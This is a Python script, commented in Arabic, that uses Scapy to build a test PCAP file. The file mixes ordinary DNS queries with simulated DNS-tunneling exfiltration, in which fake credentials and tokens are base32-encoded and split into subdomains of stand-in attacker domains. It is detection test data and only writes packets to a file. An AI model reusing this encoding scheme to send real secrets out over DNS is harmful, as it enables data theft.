"""
generate.py — صانع ملفات الاختبار وحزم الـ PCAP (PCAP Test Generator)
فريق السايبر: يحيى وبودا
المهمة:
- توليد ملفات PCAP واقعية (traffic_dataset.pcap) تحتوي على خليط من:
  1. حزم DNS طبيعية (Benign DNS Traffic)
  2. حزم هجمات تسريب بيانات مشفرة (DNS Tunneling / Data Exfiltration)
- تمكين الفريق والمستخدم من رفع الملف واختباره على الداشبورد فورا
"""

import os
import random
from pathlib import Path

CURRENT_DIR = Path(__file__).resolve().parent
OUTPUT_PCAP = CURRENT_DIR / "traffic_dataset.pcap"

BENIGN_DOMAINS = [
    "www.google.com",
    "clients2.google.com",
    "update.googleapis.com",
    "web.whatsapp.com",
    "api.github.com",
    "cdn.cloudflare.com",
    "ocsp.digicert.com",
    "www.microsoft.com",
    "en.wikipedia.org",
    "stackoverflow.com",
    "cdn.jsdelivr.net",
    "cloudflare-dns.com"
]

EXFIL_BASES = [
    "c2-tunnel.darknet-relay.top",
    "payload.shadow-ops.xyz",
    "exfil.attacker-dns.cc",
    "stealer-channel.biz"
]


def generate_test_pcap(output_path: Path = OUTPUT_PCAP, num_benign: int = 50, num_attacks: int = 30):
    """توليد ملف PCAP حقيقي باستخدام Scapy يحتوي على حزم IP/UDP/DNS"""
    try:
        from scapy.all import Ether, IP, UDP, DNS, DNSQR, wrpcap
    except ImportError:
        print("[!] Scapy is required to generate PCAP files. Run: pip install scapy")
        return None

    packets = []
    print(f"[*] Generating {num_benign} benign DNS packets and {num_attacks} tunneling attack packets...")

    # 1. إنشاء حزم الاستعلامات الطبيعية
    for i in range(num_benign):
        domain = random.choice(BENIGN_DOMAINS)
        src_ip = f"192.168.1.{random.randint(20, 90)}"
        dns_pkt = (
            Ether() /
            IP(src=src_ip, dst="8.8.8.8") /
            UDP(sport=random.randint(49152, 65535), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
        )
        packets.append(dns_pkt)

    # 2. إنشاء حزم هجمات تسريب بيانات مشفرة بـ Base32/Hex
    import base64
    fake_secrets = [
        "admin:SuperSecretP@ssw0rd2026_finance_db",
        "api_key:sk_live_9948271a0b3f88c2918847d",
        "user_token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ]

    for secret in fake_secrets:
        encoded = base64.b32encode(secret.encode()).decode().lower().rstrip("=")
        chunks = [encoded[j:j+32] for j in range(0, len(encoded), 32)]
        attacker_base = random.choice(EXFIL_BASES)
        src_ip = f"192.168.1.{random.randint(200, 240)}"

        for idx, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{idx:02d}.{attacker_base}"
            dns_pkt = (
                Ether() /
                IP(src=src_ip, dst="8.8.8.8") /
                UDP(sport=random.randint(49152, 65535), dport=53) /
                DNS(rd=1, qd=DNSQR(qname=subdomain, qtype=random.choice(["TXT", "A"])))
            )
            packets.append(dns_pkt)

    # خلط الحزم عشوائياً لمحاكاة حركة شبكة واقعية
    random.shuffle(packets)

    # حفظ الحزم في ملف PCAP
    wrpcap(str(output_path), packets)
    print(f"[OK] Successfully generated {len(packets)} packets into: {output_path.name} ({os.path.getsize(output_path)} bytes)")
    return output_path


if __name__ == "__main__":
    generate_test_pcap()
